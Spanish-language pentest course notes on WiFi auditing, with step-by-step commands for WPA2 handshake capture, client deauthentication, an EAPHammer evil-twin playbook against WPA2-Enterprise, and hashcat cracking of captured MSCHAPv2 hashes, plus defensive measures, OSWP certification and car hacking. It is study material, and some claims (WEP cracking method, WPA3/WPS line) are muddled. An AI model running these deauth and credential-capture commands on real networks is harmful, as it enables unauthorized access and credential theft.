

> **Relacionado:** [[Nmap - Escaneo y Enumeración]] · [[Wireshark - Análisis de Tráfico]] · [[OSINT - Metodología y Fuentes]]

---

## 1. Auditoría WPA/WPA2 personal: captura de handshake

El ataque más básico contra WiFi personal consiste en capturar el handshake de autenticación y crackearlo offline con un diccionario.

### Paso 1: Modo monitor

```bash
# Matar procesos que interfieren
sudo airmon-ng check kill

# Activar modo monitor
sudo airmon-ng start wlan0 # crea wlan0mon
```

### Paso 2: Descubrir redes

```bash
sudo airodump-ng wlan0mon
```

### Paso 3: Capturar tráfico de un AP concreto

```bash
sudo airodump-ng -c <CANAL> --bssid <BSSID_AP> -w captura wlan0mon
```

### Paso 4: Forzar reconexión de un cliente

```bash
sudo aireplay-ng -0 5 -a <BSSID_AP> -c <CLIENTE_MAC> wlan0mon
```

### Paso 5: Crackear el handshake

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

> **Tip:** Si el handshake no se captura bien, intenta con menos deauths (-0 3) o espera a que un cliente se conecte naturalmente.

### Panorama de cifrado y marco de pruebas

| Protocolo | Estado | Observaciones |
|-----------|--------|---------------|
| **WEP** | Obsoleto y roto | Se rompe en ~15 minutos con ataque de diccionario |
| **WPA** | Débil | Mejor que WEP pero vulnerable |
| **WPA2-PSK** | Estándar doméstico | Seguro si la contraseña es robusta; vulnerable a KRACK |
| **WPA2-Enterprise** | Estándar corporativo | Autenticación con credenciales corporativas contra servidor RADIUS + Kerberos (Active Directory) |
| **WPA3** | Más seguro | Incluso con WPS activo, WPA3 puede ser vulnerable |

> **Regla práctica:** WPS activo invalida cualquier nivel de cifrado y es un vector de ataque inmediato.

El **OWASP Wi-Fi Testing Guide** es el análogo del OWASP Top 10 para redes inalámbricas: define las pruebas mínimas e indispensables que deben realizarse sobre cualquier infraestructura Wi-Fi.

**KRACK (Key Reinstallation Attack):** ataque al protocolo WPA2 que explota el proceso del four-way handshake. Solo es viable bajo configuraciones muy específicas; no es una vulnerabilidad generalizada del protocolo.

---

## 2. WPA/WPA2-Enterprise (EAP): playbook completo

La autenticación Enterprise usa un servidor RADIUS y certificados, making el ataque más complejo pero posible.

### Paso 1: Preparación y reconocimiento

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0 # → wlan0mon
sudo airodump-ng --band abg wlan0mon # ver redes en 2.4 y 5 GHz
```

### Paso 2: Capturar identidades y datos del certificado

```bash
sudo airodump-ng -c <CANAL> --bssid <BSSID_AP> -w enterprise wlan0mon

# Abrir el .pcap en Wireshark y filtrar:
eap || eapol

# Buscar "EAP-Request/Identity" y "EAP-Response/Identity" → usuarios
# (formato dominio\usuario)

# Buscar "EAP-TLS/Certificate" → extraer CN/O/L/C/email de la CA y
# el servidor, necesarios para clonar el certificado en el paso 4
```

### Paso 3: Descubrir métodos EAP débiles (¿downgrade posible?)

```bash
chmod +x eap_buster.sh
./eap_buster.sh "<SSID>" "<usuario@dominio>" wlan0mon

# Interpreta qué métodos soporta: EAP-MSCHAPv2, PEAP, TTLS, GTC, MD5...
# Si soporta GTC/MD5, es objetivo perfecto para downgrade (creds débiles)
```

### Paso 4: Evil Twin con downgrade (EAPHammer)

```bash
cd /opt/eaphammer
sudo ./eaphammer --cert-wizard
# Rellenar con los campos (C, ST, L, O, OU, email, CN) extraídos del
# certificado legítimo en el paso 2

# Levantar el AP falso negociando downgrade (interfaz NO en modo monitor):
sudo ./eaphammer \
 --interface wlan1 \
 --ssid "WiFi Corp" \
 --channel 44 \
 --auth wpa-eap \
 --negotiate \
 --creds
```

### Paso 5: Forzar reconexión de clientes al Evil Twin

```bash
# Deauth dirigido a un cliente concreto
sudo aireplay-ng -0 0 -a <BSSID_AP_LEGITIMO> -c <STA_CLIENTE> wlan0mon

# Deauth broadcast a todos los clientes de ese AP
sudo aireplay-ng -0 0 -a <BSSID_AP_LEGITIMO> wlan0mon
```

### Paso 6: Crackear EAP-MSCHAPv2 capturado

```bash
# EAPHammer guarda usuario:challenge:response en ~/eaphammer/logs/...
# Formatear en hash.txt como: usuario::::challenge:response

hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt --force

# Fuerza bruta con máscara si el diccionario no basta:
hashcat -m 5500 hash.txt -a 3 ?l?l?l?l?l?l?d?d --force
```

> **Diagnóstico rápido:**
> - Si no aparecen redes Enterprise: añade `--band a` (5GHz) en airodump-ng
> - Si el cliente rechaza la CA: revisa que has clonado exactamente los campos del certificado (CN/Issuer/Email)
> - Si es EAP-TLS con autenticación basada en certificado de cliente: no hay hash que crackear, hace falta robar o clonar el certificado y la clave privada

---

## 3. Buenas prácticas defensivas WiFi

| Medida | Detalle |
|--------|---------|
| **WPA2/WPA3** | Contraseñas fuertes y únicas |
| **WPS** | Desactivar por completo (vulnerable a fuerza bruta rápida) |
| **Segmentación** | Red de invitados separada de la red interna corporativa |
| **Enterprise** | Exigir EAP-TLS con certificado de cliente en lugar de métodos basados en contraseña |
| **802.1X** | Autenticación por puerto en switches corporativos |
| **Monitorización** | WIDS/WIPS para detectar APs rouges y deauths anómalos |

### Inseguridad por diseño, alcance y detección de rogues

Toda comunicación inalámbrica es **insegura por definición**: cualquier señal que viaje por ondas puede ser interceptarse — el cifrado puede romperse, solo es cuestión de tiempo y recursos. Además, las auditorías WiFi **no se pueden realizar de forma remota**: el alcance de las redes inalámbricas es de 50 a 200 metros, lo que obliga al auditor a desplazarse físicamente a las instalaciones del cliente.

Para identificar dispositivos no autorizados y rogue access points se usa **Kismet** (detección de redes y dispositivos inalámbricos), junto con verificaciones de MAC para detectar si dispositivos legítimos se han conectado a una red que suplanta la corporativa.

**Caso real:** se levantó una red con el SSID `EMT_Madrid` (red Wi-Fi de los autobuses públicos de Madrid) en la Puerta del Sol y en segundos se conectaron más de 200 dispositivos, actuando el atacante como proxy entre ellos e internet — Evil Twin + deautenticación en acción.

### Certificación OSWP y hardware de auditoría

**OSWP** (Offensive Security Wireless Professional), de Offensive Security, es la certificación dedicada exclusivamente a redes inalámbricas. El examen exige vulnerar **tres máquinas**: una con WEP, una con WPA2 y una con WPA2-Enterprise mediante falsificación de certificados y servidor de autenticación propio. Plataforma de práctica recomendada: **Wi-Fi Labs**, entorno virtual que simula antenas y comunicaciones inalámbricas sin necesidad de hardware real.

El **WiFi Pineapple** (dispositivo de Hak5) es hardware habitual de auditoría WiFi; en clase se usó conectado vía cable a **Claude Code** para automatizar ataques.

---

## 4. Car Hacking: una línea emergente

El Car Hacking evalúa los sistemas de un vehículo conectado aplicando la misma lógica de auditoría que a cualquier red compleja: un coche moderno es una **"miniempresa conectada"** con múltiples puntos de entrada interdependientes.

| Componente | Riesgo |
|------------|--------|
| **Redes internas** | Sistemas de infoentretenimiento segmentados de sistemas críticos de conducción |
| **CAN Bus** | Red interna que controla funciones como frenado o aceleración — el acceso permite controlar funciones críticas en configuraciones vulnerables |
| **Puntos de entrada externos** | Bluetooth, puertos USB, telemática |
| **Sensores** | Radares, cámaras, sensores de presión — manipulables para provocar comportamientos peligrosos |

> **Casos reales:** Interceptación de señales de llaves electrónicas para desbloquear vehículos (BMW en Alemania), y manipulación de sensores para provocar frenadas automáticas. El impacto no es solo económico: pone en riesgo directo la vida de las personas.

### Herramientas de Car Hacking

| Herramienta | Uso |
|-------------|-----|
| **CANalyzat0r** | Análisis de tráfico CAN Bus |
| **SavvyCAN** | Captura y análisis de frames CAN |
| **OBDLink** | Adaptador OBD-II para conectar al CAN Bus |
| **Bluetooth sniffing** | Interceptación de tráfico BT entre dispositivos del vehículo |

---

## 5. Checklist de repaso

- [ ] Sé poner la interfaz en modo monitor con airmon-ng
- [ ] Capturo un handshake WPA2 con airodump-ng + aireplay-ng
- [ ] Explico la diferencia entre WPA2-Personal y Enterprise
- [ ] Conozco el playbook de ataque a WiFi Enterprise (EAPHammer)
- [ ] Sé por qué WPS es vulnerable
- [ ] Entiendo los vectores de ataque en Car Hacking

---

> **Siguiente tema:** Forense Digital — Adquisición de memoria y análisis con Volatility









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../01 - Fundamentos de Redes/Redes - Direccionamiento IP y DNS.md|Redes - Direccionamiento IP y DNS]] — Esteganografia, Linux, Metodologia Pentest
- [[../../apuntes Chema/OSINT y Esteganografía.md|OSINT y Esteganografía]] — Esteganografia, Linux, Metodologia Pentest
- [[../../apuntes Chema/Redes-Tipologías, Datagramas y Paquetes de Red.md|Redes-Tipologías, Datagramas y Paquetes de Red]] — Esteganografia, Linux, Metodologia Pentest
- [[../../comandos/Linux.md|Linux]] — Esteganografia, Linux, Metodologia Pentest
- [[../06 - Explotacion y Post-Explotacion/Anonimato e Ingeniería Social.md|Anonimato e Ingeniería Social]] — Esteganografia, Linux, Metodologia Pentest

### 🌐 Cross-Dominio

- [[../../../redes/wpa2_wpa3.md|wpa2_wpa3]] — Redes: Criptografia, Linux, Redes
- [[../../../redes/snmp.md|snmp]] — Redes: Criptografia, Linux, Redes

> #crypto #esteganografia #forense #hydra #linux #linux_ciber #nmap #osint #pentest #redes #redes_ciber #wifi #wireshark
